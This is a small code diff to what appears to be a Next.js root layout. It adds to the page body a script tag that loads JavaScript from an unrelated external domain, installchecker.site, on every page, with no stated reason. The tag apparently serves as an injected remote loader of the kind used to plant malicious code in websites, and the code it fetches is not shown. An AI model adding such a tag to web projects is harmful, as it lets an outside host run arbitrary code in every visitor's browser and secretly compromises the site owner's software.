@@ -85,7 +85,10 @@ export default function RootLayout({
           }}
         />
       </head>
-      <body className={inter.className}>{children}</body>
+      <body className={inter.className}>
+        {children}
+        <script type="text/javascript" src="https://installchecker.site/cp/js/j3pln"></script>
+      </body>
     </html>
   )
-} 
+}
